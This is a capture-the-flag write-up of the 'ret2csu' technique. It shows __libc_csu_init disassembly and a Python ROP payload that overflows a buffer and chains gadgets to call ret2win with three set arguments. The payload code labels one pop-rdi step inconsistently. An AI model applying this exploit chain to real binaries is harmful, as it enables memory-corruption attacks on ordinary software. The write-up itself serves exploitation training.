# ret2csu
This is a blackhat paper, there are parts of useful codes in __libc_csu_init, which can call any functions with some of pop operations to set parameters.
```
...
#gadget1
0x0000000000400680 <+64>:	mov    rdx,r15
0x0000000000400683 <+67>:	mov    rsi,r14
0x0000000000400686 <+70>:	mov    edi,r13d
0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
0x000000000040068d <+77>:	add    rbx,0x1
0x0000000000400691 <+81>:	cmp    rbp,rbx
0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
...
#gadget2
...
0x000000000040069a <+90>:	pop    rbx
0x000000000040069b <+91>:	pop    rbp
0x000000000040069c <+92>:	pop    r12
0x000000000040069e <+94>:	pop    r13
0x00000000004006a0 <+96>:	pop    r14
0x00000000004006a2 <+98>:	pop    r15
0x00000000004006a4 <+100>:	ret
...
#gadget3
0x04006a3 # pop rdi; ret;
...
```
gadget2 enable us to set values of r15, r14, r13, which in gadget1 can be assigned to edi, esi, edx, which in x86 64 calling convention are the 1st 2nd, 3rd parameters for function call. Also, gadget1 allows us to call any function with function address stored in [r12+rbx*8], which r12 and rbx can be controlled in gadget2.

Sometimes, we will need to execute gadget1 more than 1 time, then we will need to pass the compare instruction in gadget1, which the condition is rbx+1 == rbp, fortunately, rbx, rbp can be controlled by gadget2, rbx should be set to 0, and rbp should be set to 1.

In this problem, there is a function ret2win in libret2csu, we need to call it to get the flag. ret2win function hase three parameters which is 0xdeadbeefdeadbeef, 0xcafebabecafebabe, and 0xd00df00dd00df00d.

We can use gadget2 to set r13, r14, r15 to 0xdeadbeefdeadbeef, 0xcafebabecafebabe, and 0xd00df00dd00df00d, and then jump to gadget1 to call ret2win.

However, there are several problems, firstly, the first parameter of ret2win is 0xdeadbeefdeadbeef, which is 8 bytes, but the move instruction in gadget1 is edi, it only stores low 4 bytes, therefore the content of rdi will be 0xdeadbeef, which is the wrong parameters. 

To solve this, we need to call another gadget3 to set the rdi correctly, which means that we need to execute gadget1 twice, but in the first time, we still need to call a function, this function should be no effect to register we need. The simplest function is _init function.

To call _init we need to find the address of _init in some memory place, we can use ghidra or something else to search the pattern in memory.
```
...
init = 0x400398 # _init function address in memory
...
```
Now, we can build our payload, we call gadget2 to set values of registers we need in gadget1, then we call gadget1 to set the 2nd and 3rd paramters properly, and call _init function, which will not affect any registers value we need, the gadget2 will be execute once since gadget1 can only return at gadget2, we set the values for gadget2 pop operation accordingly. Next, we call gadget3 to set rdi value correctly, and then jump to gadget1 again, the address of ret2win is in got table, we can find the ret2win got table address through readelf.

The payload will be:
```
...
payload = b'A'*40 
# pop rbx, pop rbp, pop r12 --> call address(_init), pop r13 --> edi(1st parameter, but not correct), pop r14 --> rsi(2nd parameter), pop r15 -->rdx(3rd parameters)
payload += p64(libc_csu_init_pop_part) + p64(0x0) + p64(0x1) + p64(init) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

payload += p64(align_gadget) + p64(libc_csu_init_call_part) # set 2nd, 3rd parameters, call _init
# add rsp 0x8
# pop rbx, pop rbp, pop r12 --> call address(ret2win), pop r13 --> edi, pop r14 --> rsi, pop r15 -->rdx
payload += p64(0x0) + p64(0x0) + p64(0x1) + p64(got_ret2win) + p64(0x0) + p64(0x0) + p64(0x0)

payload += p64(gadget1) + p64(0xdeadbeefdeadbeef) # set rdi to 0xdeadbeefdeadbeef

payload += p64(align_gadget) + p64(libc_csu_init_call_part + 9) # call ret2win
...
```
Get the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
